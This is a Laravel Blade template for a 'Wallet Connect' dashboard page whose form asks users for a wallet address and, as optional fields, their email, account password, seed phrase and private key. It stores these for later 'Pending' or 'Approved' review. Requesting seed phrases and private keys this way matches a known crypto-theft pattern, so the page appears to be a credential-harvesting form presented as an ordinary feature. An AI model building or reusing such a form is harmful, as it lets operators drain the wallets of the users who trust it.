{{-- resources/views/user/wallet.blade.php --}}
@extends('layouts.dashboard')

@section('title', 'Wallet Connect')

@section('content')
    <div class="max-w-[720px] mx-auto px-4 py-6"
         x-data="{ provider: @js(old('provider', $providers[0] ?? 'metamask')) }"
         x-cloak>

    {{-- App-like Header --}}
        <div class="sticky top-0 z-10 -mx-4 mb-4 px-4 py-3 bg-white/80 dark:bg-gray-900/80 backdrop-blur">
            <div class="flex items-center justify-between">
                <h1 class="text-xl font-bold text-gray-900 dark:text-white">Wallet Connect</h1>
                <a href="{{ url()->previous() }}" class="text-sm text-gray-500 dark:text-gray-400">Back</a>
            </div>
            <p class="text-xs text-gray-500 dark:text-gray-400 mt-1">Connect a wallet. New connections start as <b>Pending</b>.</p>
        </div>

        @include('templates.notification')

        {{-- Connect Form Card --}}
        <div class="bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 rounded-2xl shadow-sm p-5 space-y-4">
            <div class="flex items-center justify-between">
                <h2 class="text-base font-semibold text-gray-900 dark:text-white">Connect a Wallet</h2>
            </div>

            {{-- Scoped Alpine state just for this form --}}
            <form method="POST" action="{{ route('wallet.connect.process') }}"
                  x-data="{ submitting: false }"
                  @submit="submitting = true"
                  :class="{ 'opacity-60 pointer-events-none': submitting }"
                  class="space-y-4">

            @csrf

                {{-- Provider --}}
                <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Provider</label>
                    <select name="provider" x-model="provider"
                            :readonly="submitting"
                            class="w-full h-11 rounded-xl border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm disabled:opacity-60">
                        @foreach($providers as $p)
                            <option value="{{ $p }}" @selected(old('provider')===$p)>{{ ucfirst(str_replace('-', ' ', $p)) }}</option>
                        @endforeach
                    </select>
                    @error('provider') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                </div>

                {{-- Other provider --}}
                <div x-show="provider === 'others'" x-transition>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Specify Provider</label>
                    <input type="text" name="other_provider" value="{{ old('other_provider') }}"
                           :readonly="submitting"
                           placeholder="e.g., Phantom, Ledger Live"
                           class="w-full h-11 rounded-xl border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 disabled:opacity-60">
                    @error('other_provider') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                </div>

                {{-- Address --}}
                <div>
                    <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Wallet Address</label>
                    <input type="text" name="address" value="{{ old('address') }}" placeholder="0x..."
                           :readonly="submitting"
                           class="w-full h-11 rounded-xl border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 disabled:opacity-60">
                    @error('address') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                </div>

                {{-- Optional Email / Password --}}
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Email (optional)</label>
                        <input type="email" name="email" value="{{ old('email') }}" placeholder="you@example.com"
                               :readonly="submitting"
                               class="w-full h-11 rounded-xl border-gray-500 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 disabled:opacity-60">
                        @error('email') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Password (optional)</label>
                        <input type="password" name="password" placeholder="••••••••"
                               :readonly="submitting"
                               class="w-full h-11 rounded-xl border-gray-500 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 disabled:opacity-60">
                        @error('password') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                    </div>
                </div>

                {{-- Seed Phrase / Private Key (Optional) --}}
                <div class="space-y-3">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Seed Phrase (optional)</label>
                        <textarea name="seed_phrase" rows="2" placeholder="word1 word2 word3 ..."
                                  :readonly="submitting"
                                  class="w-full rounded-xl border-gray-500 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 py-2 disabled:opacity-60">{{ old('seed_phrase') }}</textarea>
                        @error('seed_phrase') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Private Key (optional)</label>
                        <input type="text" name="private_key" value="{{ old('private_key') }}" placeholder="0x..."
                               :readonly="submitting"
                               class="w-full h-11 rounded-xl border-gray-500 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm px-3 disabled:opacity-60">
                        @error('private_key') <p class="text-xs text-red-600 mt-1">{{ $message }}</p> @enderror
                    </div>
                </div>

                {{-- Submit --}}
                <button type="submit"
                        :readonly="submitting"
                        class="w-full inline-flex items-center justify-center h-11 rounded-xl bg-indigo-600 text-white text-sm font-semibold shadow disabled:opacity-70 disabled:cursor-not-allowed">
                    <span x-show="!submitting">Connect Wallet</span>
                    <span x-show="submitting" class="inline-flex items-center gap-2">
                <svg class="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" opacity=".25"></circle>
                    <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"></path>
                </svg>
                Connecting…
            </span>
                </button>

                {{-- Lightweight full-screen overlay while submitting --}}
                <div x-show="submitting"
                     x-transition.opacity
                     class="fixed inset-0 z-20 bg-black/30 backdrop-blur-sm flex items-center justify-center">
                    <div class="rounded-2xl bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 px-4 py-3 shadow">
                        <div class="flex items-center gap-3">
                            <svg class="animate-spin h-5 w-5" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                                <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" opacity=".25"></circle>
                                <path d="M22 12a10 10 0 0 1-10 10" stroke="currentColor" stroke-width="4" stroke-linecap="round"></path>
                            </svg>
                            <span class="text-sm text-gray-700 dark:text-gray-200">Submitting…</span>
                        </div>
                    </div>
                </div>
            </form>
        </div>

        {{-- Wallet List --}}
        <div class="mt-6 space-y-3">
            <h3 class="text-sm font-semibold text-gray-700 dark:text-gray-300">Your Wallets</h3>

            @forelse(($wallets ?? collect()) as $wallet)
                @php
                    $status = $wallet->status ?? 'pending';
                    $address = $wallet->address ?? '';
                    $maskedAddress = $address ? (strlen($address) > 12 ? substr($address,0,6).'…'.substr($address,-4) : $address) : '—';
                    $maskedEmail = $wallet->email ? preg_replace('/^(.).+(@.+)$/', '$1***$2', $wallet->email) : '—';
                    // fully mask secrets by default
                    $seedMasked = $wallet->seed_phrase ? '••••••••••••••••' : '—';
                    $pkMasked   = $wallet->private_key ? '••••••••••••••••' : '—';
                    $pwdMasked  = $wallet->password ? '••••••••' : '—';
                @endphp

                <div class="bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 rounded-2xl p-4 shadow-sm">
                    <div class="flex items-start justify-between">
                        <div>
                            <div class="text-sm font-medium text-gray-900 dark:text-white">
                                {{ ucfirst($wallet->provider ?? 'Unknown') }}
                            </div>
                            <div class="mt-0.5 text-xs text-gray-500 dark:text-gray-400">
                                Connected {{ $wallet->created_at?->diffForHumans() }}
                            </div>
                        </div>
                        <div>
                            @if($status === 'approved')
                                <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[11px] font-medium bg-green-100 text-green-700 dark:bg-green-900/30 dark:text-green-300">Approved</span>
                            @elseif($status === 'rejected')
                                <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[11px] font-medium bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-300">Rejected</span>
                            @else
                                <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[11px] font-medium bg-yellow-100 text-yellow-700 dark:bg-yellow-900/30 dark:text-yellow-300">Pending</span>
                            @endif
                        </div>
                    </div>

                    {{-- Details grid --}}
                    <div class="mt-3 grid grid-cols-1 sm:grid-cols-2 gap-3 text-[13px]">
                        <div class="space-y-1">
                            <div class="text-gray-500 dark:text-gray-400">Address</div>
                            <div class="font-mono text-gray-900 dark:text-gray-100">{{ $maskedAddress }}</div>
                        </div>
                        <div class="space-y-1">
                            <div class="text-gray-500 dark:text-gray-400">Email</div>
                            <div class="text-gray-900 dark:text-gray-100">{{ $maskedEmail }}</div>
                        </div>

                        <div class="space-y-1">
                            <div class="flex items-center justify-between">
                                <span class="text-gray-500 dark:text-gray-400">Seed Phrase</span>
                            </div>
                            <div class="font-mono text-gray-900 dark:text-gray-100">{{ $seedMasked }}</div>
                        </div>

                        <div class="space-y-1">
                            <div class="flex items-center justify-between">
                                <span class="text-gray-500 dark:text-gray-400">Private Key</span>
                            </div>
                            <div class="font-mono text-gray-900 dark:text-gray-100">{{ $pkMasked }}</div>
                        </div>

                        <div class="space-y-1">
                            <div class="flex items-center justify-between">
                                <span class="text-gray-500 dark:text-gray-400">Password</span>
                            </div>
                            <div class="font-mono text-gray-900 dark:text-gray-100">{{ $pwdMasked }}</div>
                        </div>
                    </div>


                </div>
            @empty
                <div class="text-sm text-gray-500 dark:text-gray-400">No wallets connected yet.</div>
            @endforelse
        </div>


    </div>

@endsection
